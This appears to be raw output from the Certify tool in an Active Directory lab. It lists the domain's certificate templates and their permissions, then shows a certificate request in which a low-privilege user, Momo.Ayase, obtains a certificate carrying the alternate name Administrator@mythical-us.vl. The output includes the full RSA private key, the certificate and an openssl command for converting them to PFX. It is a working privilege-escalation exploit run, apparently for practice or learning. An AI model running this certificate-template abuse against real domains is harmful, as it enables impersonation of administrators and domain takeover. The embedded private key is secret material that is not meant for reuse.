        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : SubCA
    Schema Version                  : 1
    Validity Period                 : 5 years
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag           : NONE
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : DomainControllerAuthentication
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag           : AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : DirectoryEmailReplication
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : KerberosAuthentication
    Schema Version                  : 2
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag           : AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
        AutoEnrollment Rights       : MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519



Certify completed in 00:00:11.0760097



   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : MYTHICAL-US\Momo.Ayase
[*] No subject name specified, using current context as subject.

[*] Template                : Machine
[*] Subject                 : CN=Momo Ayase, OU=employees, DC=mythical-us, DC=vl
[*] AltName                 : Administrator@mythical-us.vl

[*] Certificate Authority   : dc01.mythical-us.vl\mythical-us-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 4

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA5Xbp9KSy1VERoPvwgDxV0XemcUSn4w/yGGRksL/oKrgllt2U
20ILavhMrGu+Z1Zxvj1qdI/RaSb2dvIbPTe3ya+28MqYm2cSldzOlQUKFqlA5f+a
5wTZLT9ROXMAYwQnuJTL1MoQw09Ngbpf9NQn6DnR9L/8+g3yJvNdnRqkkgGSGhec
tDkAAZcQjbKHLlR4O7o+NB6zkknARZhihXV5ySNwb8VcZm12Wj0NdpeWFnTOH1Qc
glAYFg/2Tbgtle/XW55m0ja/+u1o050uZas4jtaBNKC+x6qn0jtJBMrbE5xw6w2I
EFofQ6l6YdbffOu/Hd0tg0niSg2BjaJQoM+cdQIDAQABAoIBAEqQSZXlrvcCUOgu
9ge1k21to/hKhwORuumSNeX5dkfrbsuHVUeqPmuUI9YjbMvHm05mRqF52mKA9rXQ
FmneISq4nonAS7az16Y7CiYCbTTP6vbSCFPpj2jUmmBArm9+einQsCuFPc05h8YP
+f5kslMT9tXBTUM0JOvjSRg0ACYxHufJ6e9qIpfvJtbitMCWMAqqoWPa2PXTBEfs
sXrMHTcqUYqWxLTqONIvHmIAnYY326g5GUEwiNNMRrTTsJ9abFFr3jmaCfZXDyTx
HRYgpN2Sl1WhY7UJ1rM3Z2gen4dp96FG5pnRWT8SiaaiB4jBkUSrd9v0tTYn79Fm
V56h0kECgYEA7Fpkl2j6KDb2U5dq0Vv+NbFDte5ANTqhCW6YAD7LOFAyjlX2F1bi
3ZBFZT7yKsojlzURs17sB3EF6e1tKdw6899PyvNNELhB18gdexIeqWvKFe+ZLfF/
/5d9z8ESm6Qj22pXxhsrifKwgrWn7Y1hAaZ741BdV8vDU4Eud4i7LoMCgYEA+Inu
bpUNxeEcO6OnKWBXmUY/YQ3xw/XO3iMnsyjhvqTlPQRcQs33rcv81+dC8tAyCI+c
mUqChrF61GSXf771kNSu+UfUStsuSh7r9iwluCBEIzynekGFG0g5+ue12QowFaf2
3XQHT0z78KNjSFuGlJ2xum8qptQbLY0+dl2Xl6cCgYEAoo4g9QncU2BJ1oAjlU5h
7me2nB/6xSFHtIb9v91wQ5DU1JRGpxK5AY3CTLoYMFnKVKrJO8ajKxMO8C69j7bK
TQRfisP/UuqHTnNx4z05HWjnGmMpxTF9yTpV61dtBuLDTps7NyNktIHX6G4ryvQb
rdjlCBgzuriH5JzKaqf9pSUCgYEAjZZOTZL+aKdIZTVi6nBnFvts6cZ+34ruEaBn
Ymo8yFW5/lu4j5o0qj7WSM0HV7qBdl0R8kX/O+pptgukPvMzhBGVqI9iAk8A/NrG
w9P8nPtMteI86qnewV8RIL3V29Iw+HVabmhGLcgGkt0Rl0wEzC9V64ae/rFA1l9r
oRTKYmsCgYEAxz7ddZIvx1FGG9kZAsZ3Njmzp3RN3dR1CLYGgD+BWD9HraMAStpR
HStP9ruf22t/Szx+596c58V1T2Xf3MROAKnhPyUYW5TwRKWfFbcJNaPZzCFaGVJ5
txSXIK/mMVNR9NYlUIBaHUWSnEh35tHUeLdCJ99Nn0fvhDByCXV2brM=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGojCCBIqgAwIBAgITJwAAAAQ2TIgwEQ5g0gAAAAAABDANBgkqhkiG9w0BAQsF
ADBPMRIwEAYKCZImiZPyLGQBGRYCdmwxGzAZBgoJkiaJk/IsZAEZFgtteXRoaWNh
bC11czEcMBoGA1UEAxMTbXl0aGljYWwtdXMtREMwMS1DQTAeFw0yNjAzMTQxODUy
MjZaFw0yNzAzMTQxODUyMjZaMFoxEjAQBgoJkiaJk/IsZAEZFgJ2bDEbMBkGCgmS
JomT8ixkARkWC215dGhpY2FsLXVzMRIwEAYDVQQLEwllbXBsb3llZXMxEzARBgNV
BAMTCk1vbW8gQXlhc2UwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDl
dun0pLLVURGg+/CAPFXRd6ZxRKfjD/IYZGSwv+gquCWW3ZTbQgtq+Eysa75nVnG+
PWp0j9FpJvZ28hs9N7fJr7bwypibZxKV3M6VBQoWqUDl/5rnBNktP1E5cwBjBCe4
lMvUyhDDT02Bul/01CfoOdH0v/z6DfIm812dGqSSAZIaF5y0OQABlxCNsocuVHg7
uj40HrOSScBFmGKFdXnJI3BvxVxmbXZaPQ12l5YWdM4fVByCUBgWD/ZNuC2V79db
nmbSNr/67WjTnS5lqziO1oE0oL7HqqfSO0kEytsTnHDrDYgQWh9DqXph1t98678d
3S2DSeJKDYGNolCgz5x1AgMBAAGjggJqMIICZjAdBgkrBgEEAYI3FAIEEB4OAE0A
YQBjAGgAaQBuAGUwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMA4GA1Ud
DwEB/wQEAwIFoDAdBgNVHQ4EFgQUAwMNJFX0y6J43zvMgcozGi1/mZUwNwYDVR0R
BDAwLqAsBgorBgEEAYI3FAIDoB4MHEFkbWluaXN0cmF0b3JAbXl0aGljYWwtdXMu
dmwwHwYDVR0jBBgwFoAU9bkc8DOViFPTfoICvqYW/l3Nr24wgdEGA1UdHwSByTCB
xjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049bXl0aGljYWwtdXMtREMwMS1DQSxDTj1k
YzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
cyxDTj1Db25maWd1cmF0aW9uLERDPW15dGhpY2FsLXVzLERDPXZsP2NlcnRpZmlj
YXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRp
b25Qb2ludDCByAYIKwYBBQUHAQEEgbswgbgwgbUGCCsGAQUFBzAChoGobGRhcDov
Ly9DTj1teXRoaWNhbC11cy1EQzAxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW15dGhp
Y2FsLXVzLERDPXZsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0
aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4ICAQC7qbXW6IELjeXz
UM0lcXtYZl0qQ6IPVwXQAxLCgYNfq8JeAOpofXte4vxHltAH2MBgCFywqghAkaDd
kYagjWP3Kc/Mr5Y8CgljwU4JZBcBpixJKcRLlrMGqb7ocv5l24yNwlnY5AwQZhQA
JIWyaO6Jz32GdKGY8P6mcnzcZ0N2LQ0Ru+bWd3SRv7g1tgrQtQp7V2FJNf6k7PMl
2X409qekNJVtl51wd5OS4N+wlVzdy5AziRMOWRwbkXXHvzoK5gNpn+0hpXPVZqcR
AYz+wonP3kAKOV+8ZmUjGs+qjTz4GyPztlER26zNZNuClV9j1n/5qCMn2rhsuJco
1/c9g8BbLGui9aJ3TAcyNgwevwUjZbJTHPPywwZPmYL6ib4eBbsJ3r23djqQ28Bf
moR5E4fnhHfSIoWScNLjL9RtsBYLVjhxH3nFw7a1zjXIoij8k+5/Ebm2YizL5jKX
2RqGW3VMYQXKOqhBnxLO/oIGNDV6zi8c12lLSs72gzHBr2dgh+ziWYYMQOGfsYnW
E6ilsfHFe+8aGUCj54C+VmRkDmihhWzXkKQreVSI94G5xNp7hfjHhyzE28MKSRsx
Eoyv+tH6g0kwF+FeQ+imRu7y1ZAs0X/87GSTvpOZVLMRHCXcCo0Mn1VMvIZwxZVR
TwmYTTaSnHA8ADLUHFi/9o3vlWay9Q==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:15.0362944






